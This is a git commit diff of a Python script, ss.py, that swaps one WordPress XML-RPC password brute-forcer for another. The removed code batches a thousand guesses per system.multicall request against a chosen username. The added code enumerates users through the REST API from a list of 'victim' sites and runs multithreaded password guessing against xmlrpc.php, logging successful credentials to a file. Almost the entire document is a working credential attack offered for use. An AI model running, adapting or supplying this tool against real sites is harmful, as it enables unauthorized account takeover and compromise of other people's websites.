f28fed3cc1f95ecf95403cb0aef15a24c1c6cd0c
slizyoke <55554740+slizyoke@users.noreply.github.com>
2020-02-12 16:21:13 +0300

    Update ss.py

--- ss.py
+++ ss.py
@@ -1,154 +1,99 @@
+import requests,argparse,sys,json,time
+from termcolor import colored
+from concurrent.futures import ThreadPoolExecutor
 
-#!/usr/bin/python3
+def fetching_user(url):
+	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
+	user_list = []
+	try:
+		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=0.5).content.decode('utf-8')
+		try:
+			print(colored("[{}][!] Success Fetching user from {}".format(local_time(),url), "green"))
+			for x in json.loads(req):
+				user_list.append(x['slug'])
+		except ValueError:
+			print
+		
+	except Exception as e:
+		print
+
+	return user_list
+def check_array(arr): 
+    if len(arr) == 0: 
+        return 0
+    else: 
+        return 1
+
+def local_time():
+	t = time.localtime()
+	current_time = time.strftime("%H:%M:%S", t)
+	return current_time
+def save(format):
+	s = open("bfresult.txt", "a+")
+	s.write(format+"\n")
+
+def exploit(url, user_url, list_password):
+	try:
+		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
+
+		headers = {'Content-Type':'text/xml'}
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=5)
+		if "isAdmin" in str(r.content):
+			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
+			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
+		else:
+			print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
+	except requests.exceptions.ConnectionError as e:
+		print
+	except Exception as e:
+			print
+
+def brute_url(url):
+	try:
+		username_url = fetching_user(url)
+		user = []
+		if check_array(username_url):
+			for username in username_url:
+				user.append(username)
+		else:
+			print
+			user.append("admin")
+
+		password = "p.txt"
+
+		with ThreadPoolExecutor(max_workers=20) as executor:
+			for user_url in user:
+				with open(password, "r") as password_list:
+					for list_password in password_list:
+						executor.submit(exploit,url,user_url,list_password)
 
 
+			user.clear()
+	except requests.exceptions.ConnectionError as e:
+		print
+	except Exception as e:
+		print
 
-#######################################################################################################
-#                                         USAGE                                                       #
-#######################################################################################################
+def main():
+ 	try:
+ 		parser = argparse.ArgumentParser(description='Multiple Brute Force XMLRPC [Wordpress]')
+ 		parser.add_argument("--list", help="List website victim", required=True)
+ 		args = parser.parse_args()
+ 		try:
+ 			with open(args.list, "r") as victim:
+ 				print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
+ 				for sites in victim:
+ 					url = sites.rstrip()
+ 					brute_url(url)
+ 				print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
+ 		except IOError as e:
+ 			print("[{}][!] List website victim not exist !".format(local_time()))
+ 			sys.exit()
+ 	except KeyboardInterrupt as e:
+ 		print("[{}][!] Exit Program".format(local_time()))
+ 		sys.exit()
 
-# USAGE: python3 sliz.py http[s]://target.com/xmlrpc.php passwords.txt username     
-#        python3 sliz.py http[s]://target.com/wordpress/xmlrpc.php passwords.txt username
-#        python3 sliz.py http[s]://target.com/wp/xmlrpc.php passwords.txt username
-
-#######################################################################################################
-#                                         IMPORTS                                                     #
-#######################################################################################################
-
-from html import escape as esc
-import requests
-import math
-import xml.etree.ElementTree as ET
-import sys
-from termcolor import colored, cprint
-from time import sleep
-#######################################################################################################
-#                                         COLORS                                                      #
-#######################################################################################################
-class bcolors:
-  HEADER    = '\033[95m'
-  OKBLUE    = '\033[94m'
-  OKGREEN   = '\033[92m'
-  WARNING   = '\033[93m'
-  FAIL      = '\033[91m'
-  ENDC      = '\033[0m'
-  BOLD      = '\033[1m'
-  UNDERLINE = '\033[4m'
-  CBLINK    = '\033[5m'
-  CYELLOW = '\033[33m'
-#######################################################################################################
-#                                         FUNCTIONS                                                   #
-#######################################################################################################
-
-def banner():
-  pass
-
-def verify(url): ## verify if target is vulnerable or not
-
-    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
-     ## input sys.argv for url in main()
-
-    headers = {"Content-Type": "application/lxml"}
-    r = requests.post(url, data=xmlrpc_methods, headers=headers)
-    r.encoding = 'UTF-8'
-    if "wp.getUsersBlogs" in r.text:
-        print(colored('[>]', 'green'), colored('Target is vulnerable.', 'white'))
-    else:
-        print(bcolors.CYELLOW + "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
-        print("wp.GetUsersBlogs is not enabled.")
-        print("Please report any incorrect results on GitHuB or DM on Twitter.")
-        sys.exit(0)
-
-def admin(data):
-  root = ET.fromstring(data)
-  struct_nodes = root.findall(".//struct")
-  count = 0
-
-  for struct_node in struct_nodes:
-    for members_node in struct_node:
-      for member_node in members_node:
-        if member_node.text and "isAdmin" in member_node.text:
-          return True, count
-    count += 1
-
-  return False, count
-
-def bruteforcing(url, user, passwords):
-  prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
-  payload = ""
-  suffix = "</data></array></value></param></params></methodCall>"
-
-  for password in passwords:
-    payload += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
-    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
-    payload += "</data></array></value></data></array></value></member></struct></value>"
-
-  data = prefix + payload + suffix 
-  headers = {"Content-Type": "application/lxml"}
-  r = requests.post(url, data=data, headers=headers)
-  r.encoding = 'UTF-8'
-  #print(r.text)
-  return r.text
-
-def main(argv):
-  if len(argv) < 3:
-    print(bcolors.OKGREEN + "Created by: Kavish Gour\nVersion: 1.0"+ bcolors.ENDC)
-    print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt username".format(argv[0]) + bcolors.ENDC)
-    print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt userlist.txt (in progress)".format(argv[0]) + bcolors.ENDC)
-    print(bcolors.WARNING + "Try adding 'www' if nothing works." + bcolors.ENDC)
-    sys.exit(0)
-  
-  url = argv[1] 
-  wordlist = argv[2] 
-  user = argv[3]
-  print("")
-  print(15 * '-' + "Examining Target" + 20 * '-')
-  print("") 
-  verify(url)
-  
-  print("")
-  
-  print(bcolors.WARNING + "--=[Target: " + bcolors.ENDC + url + bcolors.WARNING + "]=--" + bcolors.ENDC)
-  print("")
-
-  passwords = []
-  iterations = 1 
-  count = 0
-
-  print(colored(f"        \t[...Bruteforcing...]", 'cyan'))
-
-  with open(wordlist, encoding="ISO-8859-1") as f:
-    for line in f:
-      passwords.append(line.rstrip()) 
-      if count == 999:
-
-        response = bruteforcing(url, user, passwords)
-        found, index = admin(response)
-        if found:
-          cprint(f"{15 * '-'} BRUTEFORCE SUCCESSFULL  {15 * '-'}", attrs=['bold'])
-          cprint("--=[User found]=--", 'green', attrs=['blink'])
-          print("Login: " + user)
-          print("Password: " + passwords[index])
-          print(bcolors.OKGREEN + "--=[Exiting...]=--" + bcolors.ENDC)
-          print("")
-          sys.exit(0)
-        else:
-          # cprint(f"--=[Tried: {str(iterations * 1000)} passwords]=--", 'blue', attrs=['reverse'])
-          print(bcolors.FAIL + "--=[Tried: " + str(iterations * 1000) + " passwords]=--" + bcolors.ENDC)
-        del passwords[:]
-        iterations += 1
-        count = 0
-      count += 1
-
-  if passwords:
-    response = bruteforcing(url, user, passwords)
-    found, index = admin(response)
-    if found:
-      print("BRUTEFORCE SUCCESSFULL")
-      print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
-      print(bcolors.OKGREEN + "--=[Successful!]=--" + bcolors.ENDC)
-      sys.exit(0)
-
-  print(bcolors.FAIL + "--=[Failed]=--" + bcolors.ENDC)
-
-main(sys.argv)
+if __name__ == "__main__":
+	banner = """"""
+	print(banner)
+	main()
